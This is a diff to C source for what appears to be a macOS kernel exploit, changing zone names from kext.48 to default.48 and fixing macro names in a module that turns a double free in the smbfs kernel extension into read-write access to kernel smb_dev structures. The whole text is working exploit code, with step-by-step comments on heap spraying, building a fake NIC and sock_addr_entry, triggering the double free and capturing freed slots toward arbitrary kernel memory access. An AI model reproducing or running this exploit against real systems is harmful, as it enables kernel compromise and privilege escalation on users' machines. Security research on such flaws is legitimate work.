@@ -34,10 +34,10 @@
 
 ///
 /// This module exploits the double free vulnerability demonstrated in "poc/poc_double_free"
-/// to obtain read write access to `struct smb_dev` allocated on kext.48 zone.
+/// to obtain read write access to `struct smb_dev` allocated on default.48 zone.
 ///
 /// From the PoC, we know that we can get a NIC released twice by trying to associate a socket
-/// address with zero length to the NIC. The info about NICs in client machine are stored in
+/// address with zero length to the NIC. The information about NICs in client machine are stored in
 /// `session->session_interface_table.client_nic_info_list`. The `client_nic_info_list` is a tailq with
 /// elements of type `struct complete_nic_info_entry`. When we try to associate a socket address
 /// of zero length to a NIC which is already in the `client_nic_info_list`, the method
@@ -105,8 +105,8 @@
 /// fake NIC (of type `struct complete_nic_info_entry`) in the memory location of double free NIC
 /// after first release and before second release, we can get each entry in the `fake_nic->addr_list`
 /// released using `SMB_FREE`. By constructing `fake_nic->addr_list` with pointers to memory
-/// location in `kext.48` zone, we can get these memory locations released. This can be used to
-/// get read write access to `struct smb_dev` allocated in kext.48 zone.
+/// location in `default.48` zone, we can get these memory locations released. This can be used to
+/// get read write access to `struct smb_dev` allocated in default.48 zone.
 ///
 ///
 
@@ -155,7 +155,7 @@ smb_dev_rw_session_shared_t smb_dev_rw_shared_session_ref(smb_dev_rw_session_sha
 
 
 void smb_dev_rw_shared_session_destroy(smb_dev_rw_session_shared_t session) {
-    xpl_slider_kext_t slider = xpl_slider_kext_create(KEXT_SMBFS_IDENTIFIER, xpl_KC_BOOT);
+    xpl_slider_kext_t slider = xpl_slider_kext_create(KEXT_SMBFS_IDENTIFIER, XPL_KC_BOOT);
     xpl_kheap_free_session_destroy(&session->dbf_session, slider);
     if (session->sock_addr_entry_allocator) {
         /// Patch the `client_nic_info_list` to prevent NICs from being released
@@ -212,8 +212,8 @@ struct smb_dev_rw {
 /// The fake sock_addr_entry is allocated using `xpl_kheap_alloc` which allocates provided
 /// data as a socket address. This means that the first byte in allocated data will always be the
 /// size of allocation. Since we want to acheive read write on smb_dev which is allocated on
-/// kext.48 zone, we want the fake sock_addr_entry and fake socket_address to be allocated on
-/// kext.48 zone.
+/// default.48 zone, we want the fake sock_addr_entry and fake socket_address to be allocated on
+/// default.48 zone.
 struct xpl_kheap_alloc_entry smb_dev_rw_alloc_sock_addr(const struct sockaddr_in* smb_addr, xpl_allocator_nrnw_t nrnw_allocator) {
     for (int i=0; i<MAX_SOCK_ADDR_ALLOC_TRIES; i++) {
         struct xpl_kheap_alloc_entry entry = xpl_kheap_alloc(smb_addr, 48, AF_INET, NULL, 0, 8);
@@ -225,7 +225,10 @@ struct xpl_kheap_alloc_entry smb_dev_rw_alloc_sock_addr(const struct sockaddr_in
         /// `struct sock_addr_entry`, and since this member will be sharing data with the
         /// `sa_len` and `sa_family` fields of the allocated socket address, we want the value
         /// of pointer `addr` to have LSB value 48. We will keep on allocating fake sock_addr
-        /// until we get a allocated address with LSB value 48
+        /// until we get a allocated address with LSB value 48. Also if `sa_family` is AF_INET,
+        /// we cannot controll first 8 bytes of allocated memory and if its is AF_INET6, we
+        /// cannot controll first 24 bytes of allocated memory. Using other `sa_family` values
+        /// will allow us to control values from 3rd byte of allocated memory
         if (sa_len == 48 && sa_family != AF_INET && sa_family != AF_INET6) {
             return entry;
         } else {
@@ -234,7 +237,7 @@ struct xpl_kheap_alloc_entry smb_dev_rw_alloc_sock_addr(const struct sockaddr_in
             xpl_allocator_prpw_destroy(&entry.element_allocator);
         }
     }
-    xpl_log_error("failed to allocate kext.48 element having address ending with 48");
+    xpl_log_error("failed to allocate default.48 element having address ending with 48");
     xpl_abort();
 }
 
@@ -268,7 +271,7 @@ void smb_dev_rw_fragment_kext_32(const struct sockaddr_in* smb_addr, xpl_allocat
     xpl_allocator_nrnw_t gap_allocator = xpl_allocator_nrnw_create(smb_addr);
     for (int i=0; i<NUM_KEXT_32_FRAGMENTED_PAGES; i++) {
         xpl_allocator_nrnw_allocate(nrnw_allocator, 32, 2);
-        xpl_allocator_nrnw_allocate(gap_allocator, 32, (xpl_PAGE_SIZE / 32) - 2);
+        xpl_allocator_nrnw_allocate(gap_allocator, 32, (XPL_PAGE_SIZE / 32) - 2);
     }
     xpl_allocator_nrnw_destroy(&gap_allocator);
 }
@@ -365,14 +368,14 @@ void smb_dev_rw_match_dev_to_rw(int capture_smb_devs[NUM_SMB_DEV_CAPTURE_ALLOCS]
 
 
 /// Exploit double free vulnerability in `smb2_mc_parse_client_interface_array` to achieve
-/// read write access to smb dev (`struct smb_dev`) in kext.48 zone
+/// read write access to smb dev (`struct smb_dev`) in default.48 zone
 void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[2]) {
     xpl_allocator_nrnw_t nrnw_allocator = xpl_allocator_nrnw_create(smb_addr);
     
-    /// Make sure OOB reads in kext.32 zone will not cause kernel data abort
+    /// Make sure OOB reads in default.32 zone will not cause kernel data abort
     smb_dev_rw_fragment_kext_32(smb_addr, nrnw_allocator);
     
-    /// STEP 1: Allocate a socket address in kext.48 zone with the address of the allocated
+    /// STEP 1: Allocate a socket address in default.48 zone with the address of the allocated
     /// socket address ending with 48
     struct xpl_kheap_alloc_entry fake_sockaddr_alloc = smb_dev_rw_alloc_sock_addr(smb_addr, nrnw_allocator);
     uintptr_t fake_sockaddr = fake_sockaddr_alloc.address;
@@ -385,9 +388,9 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
     uintptr_t dbf_nic_addr = ((uintptr_t)dbf_nic.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections));
     xpl_log_debug("leaked nic at %p", (void*)dbf_nic_addr);
     
-    xpl_allocator_nrnw_allocate(nrnw_allocator, 32, xpl_PAGE_SIZE / 32 * 32);
+    xpl_allocator_nrnw_allocate(nrnw_allocator, 32, XPL_PAGE_SIZE / 32 * 32);
     
-    /// STEP 3: Allocate a fake `struct sock_addr_entry` in kext.48 zone with the value of members
+    /// STEP 3: Allocate a fake `struct sock_addr_entry` in default.48 zone with the value of members
     /// `entry->addr = fake_sockaddr`, `entry->next.tqe_next = NULL` and
     /// `entry->next.tqe_prev = dbf_nic_addr + offsetof(struct complete_nic_info_entry, addr_list.tqh_first)`.
     /// This allocated fake `sock_addr_entry` must be a valid tailq entry (`TAILQ_CHECK_NEXT` and
@@ -411,12 +414,12 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
     
     xpl_log_debug("begin double free");
     /// STEP 5: Trigger the double free of the leaked `dbf_nic`. Also in the same time, spray the
-    /// zone kext.96 with data of `fake_nic` so that after first release and before second release,
+    /// zone default.96 with data of `fake_nic` so that after first release and before second release,
     /// the memory location of `dbf_nic` will be replaced with data from `fake_nic`. This will lead
     /// to the memory of `fake_sockaddr` and `fake_sock_addr_entry` from being released
     xpl_kheap_free_session_execute(dbf_session, &fake_nic);
     
-    /// STEP 6: Spray kext.48 zone with allocations from `xpl_allocator_rw_t`. This will lead to
+    /// STEP 6: Spray default.48 zone with allocations from `xpl_allocator_rw_t`. This will lead to
     /// released memory of `fake_sockaddr` and `fake_sock_addr_entry` from being replaced
     /// by an allocation of `xpl_allocator_rw_t`.
     int error = xpl_allocator_rw_allocate(capture_allocator, NUM_DBF_CAPTURE_ALLOCS, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t idx) {
@@ -445,7 +448,7 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
     xpl_assert_err(error);
     
     if (sock_addr_entry_found_index < 0 && sockaddr_found_index < 0) {
-        xpl_log_error("failed to capture both kext.48 allocs using rw allocator");
+        xpl_log_error("failed to capture both default.48 allocs using rw allocator");
         getpass("[INFO] press enter to continue. THIS WILL CAUSE KERNEL PANIC\n");
         xpl_abort();
     } else if (sock_addr_entry_found_index < 0) {
@@ -455,13 +458,13 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
     }
     
     int num_slots = (sock_addr_entry_found_index >= 0) + (sockaddr_found_index >= 0);
-    xpl_log_debug("got %d slots in kext.48 which could be used to capture smb_dev", num_slots);
+    xpl_log_debug("got %d slots in default.48 which could be used to capture smb_dev", num_slots);
     
     int* capture_smb_devs = alloca(sizeof(int) * NUM_SMB_DEV_CAPTURE_ALLOCS);
     memset(capture_smb_devs, -1, sizeof(int) * NUM_SMB_DEV_CAPTURE_ALLOCS);
     
     /// STEP 7: Release the memory of `fake_sock_addr_entry` and `fake_sockaddr` using
-    /// references by `fake_sock_addr_entry_alloc` and `fake_sockaddr_alloc`. Also spray kext.48
+    /// references by `fake_sock_addr_entry_alloc` and `fake_sockaddr_alloc`. Also spray default.48
     /// zone with `struct smb_dev` by opening new smb devices using `smb_client_open_dev`.
     /// This will lead to the memory of `fake_sock_addr_entry` and `fake_sockaddr` from being
     /// replaced by a `struct smb_dev`. Since the memory of `fake_sock_addr_entry` and
@@ -503,7 +506,7 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
             xpl_log_debug("memory allocated by dev_rw at fd: %d changed", dev_rw_fds[i]);
         } else {
             /// Since we can only read one byte of data (address family) using `xpl_allocator_prpw_t`
-            /// we might have matched it with allocation on kext.48 zone done by someone other than
+            /// we might have matched it with allocation on default.48 zone done by someone other than
             /// `xpl_allocator_rw_t`. Unlikely but can happen.
             xpl_log_warn("num_slots mismatch, current: %d, actual: %d", num_slots, i);
             num_slots = i;
@@ -526,7 +529,7 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
     /// pair. Verify that the memory pointed by filtered `xpl_allocator_rw_t` is a valid `struct smb_dev`
     /// and mark the verfied ones as active. We keep the inactive ones because releasing them
     /// at this time might cause kernel panic. The memory allocated by those `xpl_allocator_rw_t`
-    /// backends are either now in free state or allocated to some other allocation in kext.48 zone.
+    /// backends are either now in free state or allocated to some other allocation in default.48 zone.
     /// Later when we have arbitary kernel memory read write, we will clean up these inactive
     /// `smb_dev_rw` so that they can be safely released
     int num_active_devs = 0;
@@ -550,7 +553,7 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
         xpl_allocator_prpw_destroy(&fake_sockaddr_alloc.element_allocator);
     } else {
         /// Fake sockaddr allocation is currently sharing memory with an unknown
-        /// allocated / free element in kext.48 zone. Releasing it now may panic, so we will
+        /// allocated / free element in default.48 zone. Releasing it now may panic, so we will
         /// patch and release it once we have working arbitary kernel memory read / write
         session->sockaddr_allocator = fake_sockaddr_alloc.element_allocator;
     }
@@ -559,7 +562,7 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
         xpl_allocator_prpw_destroy(&fake_sock_addr_entry_alloc.element_allocator);
     } else {
         /// Fake sock_addr_entry allocation is currently sharing memory with an unknown
-        /// allocated / free element in kext.48 zone. Releasing it now may panic, so we will
+        /// allocated / free element in default.48 zone. Releasing it now may panic, so we will
         /// patch and release it once we have working arbitary kernel memory read / write
         session->sock_addr_entry_allocator = fake_sock_addr_entry_alloc.element_allocator;
     }
@@ -594,7 +597,7 @@ int smb_dev_rw_write_data(smb_dev_rw_t dev, const struct smb_dev* data) {
     /// Release the `xpl_allocator_rw_t` backend
     close(dev->fd_rw);
     
-    /// Spray kext.48 with new data
+    /// Spray default.48 with new data
     int error = xpl_allocator_rw_allocate(capture_allocator, NUM_SMB_DEV_RECAPTURE_ALLOCS / 2, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t idx) {
         *data1 = (char*)&data_copy;
         *data1_size = 48;
@@ -688,7 +691,7 @@ uintptr_t smb_dev_rw_get_session(smb_dev_rw_t dev) {
 void smb_dev_rw_destroy(smb_dev_rw_t* rw_p) {
     smb_dev_rw_t rw = *rw_p;
     
-    xpl_slider_kext_t slider = xpl_slider_kext_create("com.apple.filesystems.smbfs", xpl_KC_BOOT);
+    xpl_slider_kext_t slider = xpl_slider_kext_create("com.apple.filesystems.smbfs", XPL_KC_BOOT);
     
     if (rw->fd_dev >= 0) {
         struct smb_dev restore;
